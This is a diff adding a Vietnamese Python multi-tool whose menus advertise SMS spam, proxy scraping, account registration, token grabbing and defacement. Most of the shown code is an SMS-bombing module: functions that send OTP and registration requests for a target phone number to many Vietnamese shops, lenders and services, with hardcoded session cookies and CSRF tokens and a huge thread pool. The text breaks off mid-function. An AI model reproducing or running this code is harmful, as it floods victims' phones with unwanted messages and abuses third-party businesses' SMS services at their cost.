@@ -1,0 +1,1878 @@
+import requests,os,time,re,json,uuid,random,sys
+from concurrent.futures import ThreadPoolExecutor
+import datetime
+import base64
+import os
+import datetime
+from datetime import datetime
+import requests,json
+import uuid
+import requests
+from time import sleep
+from random import choice, randint, shuffle
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+from os.path import isfile
+from pystyle import Colors, Colorate, Write, Center, Add, Box
+
+
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def xoa(text):
+    sys.stdout.write('\r' + text)
+    sys.stdout.flush()
+
+import datetime
+now = datetime.datetime.now()
+next_midnight = (now + datetime.timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
+time_left = next_midnight - now
+
+hours_left = time_left.seconds // 3600
+minutes_left = (time_left.seconds % 3600) // 60
+seconds_left = time_left.seconds % 60
+
+today = datetime.datetime.today()
+ngay = today.day
+thang = today.day
+os.environ['TZ'] = 'Asia/Ho_Chi_Minh'
+ma = 13420709
+
+
+IP = int(today.strftime("%Y%m%d")) + ma
+
+ippp = 12344321
+encoded_IP = base64.b64encode(str(IP).encode()).decode()
+numbers = []
+trang = "\033[1;37m\033[1m"
+xanh_la = "\033[1;32m\033[1m"
+xanh_duong = "\033[1;34m\033[1m"
+do = "\033[1;31m\033[1m"
+xam='\033[1;30m'
+vang = "\033[1;33m\033[1m"
+tim = "\033[1;35m\033[1m"
+kt_code = "</>"
+dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"
+response = requests.get('http://ipinfo.io')
+ip_data = response.json()
+Ip = ip_data.get('ip', 'N/A')
+
+
+#==========================================================================================================================
+banner = """
+  \033[1;35m\033[1m       _                      _______                      _
+      _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
+     dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
+     V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
+              `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
+               `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
+          __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
+        ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
+     _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
+                 `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
+         ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
+       ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
+      ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
+      MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
+      YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
+       `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
+         `'                  `OObNNNNNdOO'                   `'
+                               `~OOOOO~'
+                               
+                                              
+                                        \033[4m\033[94mTools auto tds bằng pro5\033[0m
+                               
+                               
+"""
+
+banner2 = """
+\033[92m\033[1m
+██╗ ██╗ █████╗          ███████╗██████╗ █████╗  ███╗  █ ██╗  ███████╗███╗   ███╗███████╗
+██║ ██╔╝██╔══██╗        ██╔════╝██╔══██╗██╔══██╗████╗ ████║  ██╔════╝████╗ ████║██╔════╝
+█████╔╝ ███████║ █████╗ ███████╗██████╔╝███████║██╔████╔██║  ███████╗██╔████╔██║███████╗
+██╔═██╗ ██╔══██║ ╚════╝ ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║  ╚════██║██║╚██╔╝██║╚════██║
+██║ ██╗ ██║  ██║        ███████║██║     ██║  ██║██║  ╚═╝██║  ███████║██║ ╚═╝ ██║███████║
+╚═╝ ╚═╝ ╚═╝  ╚═╝         ╚════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═════╝╚═╝     ╚═╝╚══════╝
+                                       
+
+
+"""
+
+chontool = f"""
+  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
+  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
+  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
+  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
+  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
+  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
+┌\033[1;37m───────────────────────────────────────────────────────┐
+│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                │
+│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m KA\033[0m                                        │
+│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
+└\033[1;37m───────────────────────────────────────────────────────┘
+
+"""
+tct = f"""
+  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
+  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
+  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
+  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
+  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
+  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
+┌\033[1;37m───────────────────────────────────────────────────────┐
+│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                │
+│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m KA\033[0m                                        │
+│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
+└\033[1;37m───────────────────────────────────────────────────────┘
+{xanh_la}Hạn Key: {tim}24 giờ{xanh_la}. Còn {tim}{hours_left} {vang}giờ {tim}{minutes_left} {vang}phút {tim}{seconds_left} {vang}giây\033[0m
+
+                                          \033[1;34m╗{tim}╔\033[0m
+          ╔════╦═══════════════════════╗  {tim}╚\033[1;36m╬{tim}╗\033[0m
+         ╔╣ {xanh_duong}ID \033[0m║        {xanh_duong}DỊCH VỤ\033[0m        ║   \033[1;34m╝{tim}╚\033[0m   
+         ║╠════╬═══════════════════════╬═══════╗
+         ║║ {vang}1\033[0m  ║        {dac_biet}CÔNG CỤ\033[0m        ║  {xanh_la}╦╔═\033[0m  ║  
+         ║║ {vang}2\033[0m  ║        {dac_biet}FACEBOOK\033[0m       ║  {vang}╠╩╗\033[0m  ║
+         ║║ {vang}3\033[0m  ║       {dac_biet}TOOL-PRO5\033[0m       ║  {tim}╩ ╩\033[0m  ║
+         ║║ {vang}4\033[0m  ║      {dac_biet}TRAO-ĐỔI-SUB\033[0m     ║   {xam}o\033[0m   ║   
+         ║║ {vang}5\033[0m  ║       {dac_biet}CHECK-PUT\033[0m       ║  {do}╔═╗\033[0m  ║      
+         ║║ {vang}6\033[0m  ║       {dac_biet}TOOL-MAIL\033[0m       ║  {trang}╠═╣\033[0m  ║ 
+         ║║ {vang}0\033[0m  ║       {dac_biet}MAIN-MENU\033[0m       ║  \033[1;36m╩ ╩\033[0m  ║
+         ╚╩════╩═══════════════════════╩═══════╝ 
+
+"""
+một  = f"""
+  \033[1;31m██╗  ██╗ █████╗    ████████╗ ██████╗  ██████╗ ██╗     
+  \033[1;36m██║ ██╔╝██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
+  \033[1;32m█████╔╝ ███████║█████╗██║   ██║   ██║██║   ██║██║     
+  \033[1;33m██╔═██╗ ██╔══██║╚════╝██║   ██║   ██║██║   ██║██║     
+  \033[1;31m██║  ██╗██║  ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
+  \033[1;35m╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+             {xanh_la} </>TOOL GỘP ĐA CHỨC NĂNG</>\033[0m
+┌\033[1;37m───────────────────────────────────────────────────────┐
+│{do}[{trang}{kt_code}{do}] {do}IP: {vang}{Ip}\033[0m                                │
+│{do}[{trang}{kt_code}{do}] \033[1;35mADMIN:\033[1;36m KA\033[0m                                        │
+│{do}[{trang}{kt_code}{do}] {dac_biet}BOX TELE:\033[1;37m https://t.me/sharetoolngon             │
+└\033[1;37m───────────────────────────────────────────────────────┘
+{xanh_la}Hạn Key: {tim}24 giờ{xanh_la}. Còn {tim}{hours_left} {vang}giờ {tim}{minutes_left} {vang}phút {tim}{seconds_left} {vang}giây\033[0m
+
+                                          
+          ╔═════╦═══════════════════════╦═════════════════════╗  
+          ║  {xanh_duong}ID \033[0m║        {xanh_duong}CÔNG CỤ\033[0m        ║        {xanh_duong}STATUS\033[0m       ║
+          ╠═════╬═══════════════════════╬═════════════════════╣
+          ║ {vang}1.1\033[0m ║       {dac_biet}SPAM-SMS\033[0m        ║      {xanh_la}hoạt động\033[0m      ║  
+          ║ {vang}1.2\033[0m ║       {dac_biet}ĐÀO PROXY\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
+          ║ {vang}1.3\033[0m ║     {dac_biet}LỌC LIVE PROXY\033[0m    ║      {xanh_la}hoạt động\033[0m      ║
+          ║ {vang}1.4\033[0m ║     {dac_biet}REG ACC GARENA\033[0m    ║      {xanh_la}hoạt động\033[0m      ║   
+          ║ {vang}1.5\033[0m ║     {dac_biet}GET TOKEN PRO5\033[0m    ║      {xanh_la}hoạt động\033[0m      ║      
+          ║ {vang}1.6\033[0m ║       {dac_biet}CHAT GPT\033[0m        ║      {xanh_la}hoạt động\033[0m      ║ 
+          ║ {vang}1.7\033[0m ║       {dac_biet}MAIN-MENU\033[0m       ║      {xanh_la}hoạt động\033[0m      ║
+          ╩═════╩═══════════════════════╩═════════════════════╝ 
+
+"""
+nhện = """
+\033[91m\033[1m
+            #               #
+          ##                 ##
+         ##                   ##
+        ##                     ##
+        ##                     ##
+        ##                     ##
+         ##                   ##
+     ##  ##                   ##  ##
+    ##   ##                   ##   ##
+   ##     ##                 ##     ##
+   #       ###             ###       #
+   ##       ###           ###       ##
+   ###       ###  #####  ###       ###
+    ######    #############   #######
+         ######################
+    ################################
+   ### ########################## ###
+  ###         ############         ###
+ ##         #################        ##
+ ##     ########################     ##
+##     ###  ################  ###     ##
+ ##    ##   #######  #######   ##    ##
+  #    ##   #######  #######   ##    #
+   #   ##   ################   ##   #
+    #  ##    ##############    ##  #
+       ##     ############     ##
+       ##       ########       ##
+        ##                    ##
+        
+                            \033[4m\033[94mtool defacement
+\033[0m
+"""
+#=====================================================================================================================
+
+
+def runbanner(text, delay=0.001):
+    for char in text:
+        print(char, end='', flush=True)
+        time.sleep(delay)
+    print()
+    
+
+def chay(text):
+    for char in text:
+        print(char, end='', flush=True)
+        delay=0.1
+        sleep(delay)
+    print()
+
+    
+while ippp > 0:
+    digit = ippp % 10
+    numbers.append(digit)
+    ippp //= 10
+
+numbers.reverse()
+
+number_index = 0
+result = ""
+
+for i in range(len(encoded_IP)):
+    result += encoded_IP[i]
+    if number_index < len(numbers):
+        result += str(numbers[number_index])
+        number_index += 1
+def xoa(text):
+    sys.stdout.write('\r' + text)
+    sys.stdout.flush()
+
+clear()
+runbanner(một)
+
+
+#====================================================================================================================================================================
+threading1 = ThreadPoolExecutor(max_workers=int(10000000))
+# 360tv ,winmart,vion,poyeye,alfresco,loship
+def cashbar(sdt):
+  headers = {
+    'Host': 'api.cashbar.tech',
+    # 'content-length': '73',
+    'accept': 'application/json, text/plain, */*',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://h5.cashbar.work',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://h5.cashbar.work/',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+  }
+  data = {
+    'phone': f'{sdt}',
+    'type': '2',
+    'ctype': '1',
+    'chntoken': '7f38e65de6b47136eaa373feade6cd33',
+  }
+  response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data).json()
+def chotot(sdt):
+  headers = {
+    'Host': 'gateway.chotot.com',
+    # 'content-length': '22',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/json',
+    'accept': '*/*',
+    'origin': 'https://id.chotot.com',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-site',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://id.chotot.com/',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    
+  }
+  data = '{"phone":"sdt"}'.replace("sdt",sdt)
+  response = requests.post('https://gateway.chotot.com/v2/public/auth/send_otp_verify', headers=headers, data=data).json()
+def pizzacompany(sdt):
+  cookies = {
+    '_gcl_au': '1.1.607819339.1691276885',
+    '_ga': 'GA1.2.453948248.1691276886',
+    '_gid': 'GA1.2.698696022.1691276886',
+    '_tt_enable_cookie': '1',
+    '_ttp': 'bwCYo8Ir1_CxxhKbysJDt5JtlQ7',
+    '_fbp': 'fb.1.1691276888170.1960321660',
+    '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8',
+    '.Nop.Customer': 'ccaefc12-aefb-4b4d-8b87-776f2ee9af1f',
+    '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
+  }
+  headers = {
+    'Host': 'thepizzacompany.vn',
+    # 'content-length': '199',
+    'accept': '*/*',
+    'x-requested-with': 'XMLHttpRequest',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'origin': 'https://thepizzacompany.vn',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://thepizzacompany.vn/Otp',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'cookie': '_gcl_au=1.1.607819339.1691276885; _ga=GA1.2.453948248.1691276886; _gid=GA1.2.698696022.1691276886; _tt_enable_cookie=1; _ttp=bwCYo8Ir1_CxxhKbysJDt5JtlQ7; _fbp=fb.1.1691276888170.1960321660; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8; .Nop.Customer=ccaefc12-aefb-4b4d-8b87-776f2ee9af1f; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
+  }
+  data = {
+    'phone': f'{sdt}',
+    '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfbQwvToQkkGuj4TN2sRcEQ1WYLq8FZcCaAf8P9JHU46UhpBthj5H4JH3oJjwi0hx_zMAPEMRGPK6X6QnCzHwfMW_RhUnFUsBEDrss3f32LBDTUcbq9dohqqQZr2VFE9Ns',
+  }
+  response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data).json()
+def onecredit(sdt):
+  cookies = {
+    'SN5c8116d5e6183': 'vd0peh2340qie49h8hksc6mktb',
+    'OnCredit_id': '64cc576f3fcca5.61640209',
+    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': '1eoY0fSNX4knqqaR+yewjR0dHrPCV8i0u+EA2ZEdAag=',
+    '_fbp': 'fb.1.1691113338133.1121666643',
+    'GN_USER_ID_KEY': '1b7eaaea-150b-4d8d-8250-69d546c1c1cb',
+    '_ga_462Z3ZX24C': 'GS1.1.1691244602.2.1.1691244602.60.0.0',
+    '_ga': 'GA1.2.148691698.1691113336',
+    '_gid': 'GA1.2.1794411839.1691244604',
+    '_gat_UA-139625802-1': '1',
+    'GN_SESSION_ID_KEY': '43953d57-7d12-402f-ae07-ad1786e8ca8b',
+    '_ga_4RZFMB042P': 'GS1.2.1691244607.2.0.1691244607.60.0.0',
+  }
+  headers = {
+    'Host': 'oncredit.vn',
+    # 'content-length': '231',
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'x-requested-with': 'XMLHttpRequest',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'origin': 'https://oncredit.vn',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://oncredit.vn/registration',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'cookie': 'SN5c8116d5e6183=vd0peh2340qie49h8hksc6mktb; OnCredit_id=64cc576f3fcca5.61640209; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=1eoY0fSNX4knqqaR+yewjR0dHrPCV8i0u+EA2ZEdAag=; _fbp=fb.1.1691113338133.1121666643; GN_USER_ID_KEY=1b7eaaea-150b-4d8d-8250-69d546c1c1cb; _ga_462Z3ZX24C=GS1.1.1691244602.2.1.1691244602.60.0.0; _ga=GA1.2.148691698.1691113336; _gid=GA1.2.1794411839.1691244604; _gat_UA-139625802-1=1; GN_SESSION_ID_KEY=43953d57-7d12-402f-ae07-ad1786e8ca8b; _ga_4RZFMB042P=GS1.2.1691244607.2.0.1691244607.60.0.0',
+  } 
+  params = {
+    'ajax': '',
+  }
+  data = {
+    'data[typeData]': 'sendCodeReg',
+    'data[phone]': f'{sdt}',
+    'data[email]': 'kdish12@gmail.com',
+    'data[captcha1]': '1',
+    'data[lang]': 'vi',
+    'CSRFName': 'CSRFGuard_ajax',
+    'CSRFToken': '59sZQFn8SF73FiA6bifZRTdRE2Eand5G77e93NDzfiKiRSH3Tbhe4tSdB3yHD2sf',
+  }
+  response = requests.post('https://oncredit.vn/', params=params, cookies=cookies, headers=headers, data=data).json()
+def concung(sdt):
+  cookies = {
+    'PHPSESSID': 'ij419v9ov5ug09ui6t5v6hul56',
+    '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3DBpy7szeD03E%3DXv5zU4fvoPk%3DptVtroTCTyo%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3Dc7XLOffW%2BH0%3Dc7gCysNyQxY%3DCNgWpQ5YeKY%3DD7U33jY70Ks%3D',
+    '__utmc': '65249340',
+    '__utmz': '65249340.1691112234.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
+    '_ga': 'GA1.1.1576173301.1691112237',
+    '_gcl_au': '1.1.601691012.1691112237',
+    '_fbp': 'fb.1.1691112237077.759562086',
+    '_tt_enable_cookie': '1',
+    '_ttp': 'JyO6InY4cht34vkn0PUDBvJMCx5',
+    '__utma': '65249340.412064474.1691112234.1691112234.1691138671.2',
+    '__utmt': '1',
+    'Srv': 'cc205|ZMy49|ZMy4w',
+    '__utmb': '65249340.3.10.1691138671',
+    '_ga_DFG3FWNPBM': 'GS1.1.1691138672.2.1.1691138724.8.0.0',
+    '_ga_BBD6001M29': 'GS1.1.1691138674.2.1.1691138726.8.0.0',
+  }
+  headers = {
+    'Host': 'concung.com',
+    # 'content-length': '167',
+    'accept': '*/*',
+    'x-requested-with': 'XMLHttpRequest',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'origin': 'https://concung.com',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://concung.com/dang-nhap.html',
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'cookie': 'PHPSESSID=ij419v9ov5ug09ui6t5v6hul56; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3DBpy7szeD03E%3DXv5zU4fvoPk%3DptVtroTCTyo%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3Dc7XLOffW%2BH0%3Dc7gCysNyQxY%3DCNgWpQ5YeKY%3DD7U33jY70Ks%3D; __utmc=65249340; __utmz=65249340.1691112234.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _ga=GA1.1.1576173301.1691112237; _gcl_au=1.1.601691012.1691112237; _fbp=fb.1.1691112237077.759562086; _tt_enable_cookie=1; _ttp=JyO6InY4cht34vkn0PUDBvJMCx5; __utma=65249340.412064474.1691112234.1691112234.1691138671.2; __utmt=1; Srv=cc205|ZMy49|ZMy4w; __utmb=65249340.3.10.1691138671; _ga_DFG3FWNPBM=GS1.1.1691138672.2.1.1691138724.8.0.0; _ga_BBD6001M29=GS1.1.1691138674.2.1.1691138726.8.0.0',
+  }
+  data = {
+    'ajax': '1',
+    'classAjax': 'AjaxLogin',
+    'methodAjax': 'sendOtpLogin',
+    'customer_phone': f'{sdt}',
+    'id_customer': '1',
+    'static_token': 'e633865a31fa27f35b8499e1a75b0a76',
+    'momoapp': '0',
+    'back': 'khach-hang.html',
+  }
+  response = requests.post('https://concung.com/ajax.html',cookies=cookies, headers=headers,data=data).json()
+def y360(sdt):
+  headers = {
+    'Host': 'y360.vn',
+    # 'content-length': '22',
+    'accept': 'application/json',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/json',
+    'origin': 'https://y360.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://y360.vn/hoc/register',
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'cookie': '_gcl_au=1.1.977893193.1691134633; _gid=GA1.2.1747107574.1691134633; _gat_gtag_UA_211029013_1=1; _fbp=fb.1.1691134636760.1633963715; _ga=GA1.1.329512893.1691134633; _ga_M7ZN50PQ1V=GS1.1.1691134632.1.1.1691134646.0.0.0; _ga_BS2V9QEV6V=GS1.1.1691134633.1.1.1691134667.0.0.0',
+    }
+  data = '{"phone":"sdt"}'.replace("sdt",sdt)
+  response = requests.post('https://y360.vn/api/v1/user/register', data=data, headers=headers).json()
+  global valuey360
+  valuey360 = response['errors']
+def y360rs(sdt):
+  headers = {
+    'Host': 'y360.vn',
+    # 'content-length': '689',
+    'accept': 'application/json',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/json',
+    'origin': 'https://y360.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://y360.vn/hoc/register/code-verify/dbde2f96-3299-11ee-a400-0242ac150006',
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'cookie': '_gcl_au=1.1.977893193.1691134633; _gid=GA1.2.1747107574.1691134633; _fbp=fb.1.1691134636760.1633963715; _gat_gtag_UA_211029013_1=1; _ga_M7ZN50PQ1V=GS1.1.1691134632.1.1.1691135104.0.0.0; _ga=GA1.1.329512893.1691134633; _ga_BS2V9QEV6V=GS1.1.1691134633.1.1.1691135122.0.0.0',
+  }
+  data = valuey360.encode()
+  response = requests.post('https://y360.vn/api/v1/user/resendCode', data=data, headers=headers).json()
+def phamacy(sdt):
+  headers = {
+    'Host': 'api-gateway.pharmacity.vn',
+    # 'content-length': '36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/json',
+    'accept': '*/*',
+    'origin': 'https://www.pharmacity.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-site',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://www.pharmacity.vn/',
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+  }
+  data = '{"phone":"sdt","referral":""}'.replace("sdt",sdt)
+  response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', data=data,headers=headers)
+def vayvnd(sdt):
+  data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("sdt",sdt)
+  head = {
+    "Host":"api.vayvnd.vn",
+    "accept":"application/json",
+    "accept-language":"vi-VN",
+    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+    "site-id":"3",
+    "content-type":"application/json; charset=utf-8",
+    "origin":"https://vayvnd.vn",
+    "x-requested-with":"mark.via.gp",
+    "sec-fetch-site":"same-site",
+    "sec-fetch-mode":"cors",
+    "sec-fetch-dest":"empty",
+    "referer":"https://vayvnd.vn/",
+    "accept-encoding":"gzip, deflate, br",
+  }
+  rq = requests.post("https://api.vayvnd.vn/v2/users",data=data,headers=head).json()
+def tamo(sdt):
+  data = '{"mobilePhone":{"number":"sdt"}}'.replace("sdt",sdt)
+  head = {
+    "Host":"api.tamo.vn",
+    "accept":"application/json, text/plain, */*",
+    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+    "content-type":"application/json;charset=UTF-8",
+    "origin":"https://www.tamo.vn",
+    "x-requested-with":"mark.via.gp",
+    "sec-fetch-site":"same-site",
+    "sec-fetch-mode":"cors",
+    "sec-fetch-dest":"empty",
+    "referer":"https://www.tamo.vn/",
+    "accept-encoding":"gzip, deflate, br",
+    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
+  }
+  rq = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()
+def meta(sdt):
+  data = '{"api_args":{"lgUser":"sdt","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("sdt",sdt)
+  head = {
+    "Host":"meta.vn",
+    "accept":"application/json, text/plain, */*",
+    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
+    "content-type":"application/json",
+    "origin":"https://meta.vn",
